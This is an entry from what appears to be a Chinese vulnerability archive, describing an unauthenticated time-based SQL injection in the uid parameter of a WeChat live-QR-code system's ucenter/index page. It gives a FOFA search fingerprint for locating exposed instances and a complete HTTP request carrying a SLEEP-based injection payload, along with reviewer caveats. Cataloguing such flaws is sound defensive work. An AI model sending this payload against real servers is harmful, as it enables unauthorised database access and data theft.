---
source: "wy876 漏洞文库"
title: "微信活码系统（发行方未知） ucenter/index uid SQL注入"
product: "微信活码系统（发行方未知）"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "MySQL，版本未知"
prerequisites: "无Cookie请求"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/gn9zt676czv8oypd"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E5%BE%AE%E4%BF%A1%E6%B4%BB%E7%A0%81/%E5%BE%AE%E4%BF%A1%E6%B4%BB%E7%A0%81%E7%B3%BB%E7%BB%9Findex%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\".qn-user-login\""
fofa_unverified: "body="
id: "vw-d1fc8090c32c11c02cb0594a"
entity_id: "ve-d1fc8090c32c11c02cb0594a"
schema_version: "1"
---

# 微信活码系统（发行方未知） ucenter/index uid SQL注入

## 条目说明

- 对象与具体问题：微信活码系统（发行方未知）；ucenter/index uid SQL注入
- 版本、配置及部署条件：MySQL，版本未知
- 认证与权限前提：无Cookie请求
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 标题index应规范ucenter/index与uid，不同微信活码源码不能全归一家
- 无响应/时间对照/修复，HTTP误标Java，二维码只错字

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
微信活码系统是基于微信平台的 二维码只管理系统，旨在帮助企业和个人实现更高效的社群运营和流量管理。可以将多个二维码合并成一个二维码的工具，用户扫描该固定二维码后，可以看到一个微信二维码(可以是群二维码，也可以是个人名片二维码)，而这些二维码可以在后台随时进行更换。通过这种方式，微信活码系统有效避免了因频繁更换二维码导致的流量丢失，提高了社群运营的效率。微信活码系统index存在SQL注入漏洞

## 二、影响版本
+ 微信活码系统

## 三、资产测绘
+ fofa `body=".qn-user-login"`
+ 特征


## 四、漏洞复现
```http
GET /ucenter/index/?uid=1)%20AND%20(SELECT%203460%20FROM%20(SELECT(SLEEP(5)))RkHL)%20AND%20(1015=1015 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gn9zt676czv8oypd>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
